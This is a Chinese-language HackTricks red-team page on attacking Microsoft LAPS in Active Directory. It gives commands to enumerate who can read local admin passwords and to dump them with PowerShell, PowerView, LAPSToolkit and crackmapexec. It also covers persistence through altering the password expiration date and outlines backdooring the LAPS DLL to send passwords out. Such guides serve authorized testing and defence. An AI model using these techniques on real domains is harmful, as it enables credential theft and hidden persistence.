# LAPS

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**吗？ 或者您想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **在Twitter上** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**上关注**我。
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>

## 基本信息

本地管理员密码解决方案（LAPS）是一种用于管理系统的工具，其中应用于域加入计算机的**管理员密码**是**唯一的、随机的和经常更改的**。这些密码安全地存储在Active Directory中，只有通过访问控制列表（ACL）授予权限的用户才能访问。通过使用**Kerberos版本5**和**高级加密标准（AES）**，确保了从客户端到服务器的密码传输的安全性。

在域的计算机对象中，实施LAPS会添加两个新属性：**`ms-mcs-AdmPwd`**和**`ms-mcs-AdmPwdExpirationTime`**。这些属性分别存储**明文管理员密码**和**其过期时间**。

### 检查是否已激活
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS密码访问

您可以从`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`下载原始LAPS策略，然后使用[**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser)软件包中的**`Parse-PolFile`**将此文件转换为人类可读格式。

此外，如果安装在我们可以访问的计算机上，可以使用**本机LAPS PowerShell cmdlet**：
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** 也可以用来找出**谁可以读取密码并读取它**：
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) 简化了对启用了 LAPS 的所有计算机进行枚举的过程。\
其中一个功能是解析**`ExtendedRights`**以获取**启用了 LAPS 的所有计算机**。这将显示专门**委派读取 LAPS 密码的组**，通常是受保护组中的用户。\
一个**加入计算机到域的帐户**会在该主机上获得`All Extended Rights`，这个权限赋予了该**帐户读取密码**的能力。枚举可能会显示一个用户帐户可以在主机上读取 LAPS 密码。这可以帮助我们**针对可以读取 LAPS 密码的特定 AD 用户**。
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **使用 Crackmapexec 转储 LAPS 密码**
如果没有访问 PowerShell 的权限，您可以通过 LDAP 远程滥用此特权。
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **LAPS Persistence**

### **Expiration Date**

一旦获得管理员权限，可以通过将到期日期设置为未来来获得密码并阻止计算机更新密码。
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
如果**管理员**使用**`Reset-AdmPwdPassword`**命令，密码仍然会被重置；或者如果在LAPS GPO中启用了**不允许密码过期时间超过策略要求**。
{% endhint %}

### 后门

LAPS的原始源代码可以在[这里](https://github.com/GreyCorbel/admpwd)找到，因此可以在代码中放置一个后门（例如在`Main/AdmPwd.PS/Main.cs`中的`Get-AdmPwdPassword`方法内），以某种方式**外泄新密码或将其存储在某处**。

然后，只需编译新的`AdmPwd.PS.dll`并将其上传到`C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`中的机器（并更改修改时间）。

## 参考资料
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？您想看到您的**公司在HackTricks中做广告**吗？或者您想访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>
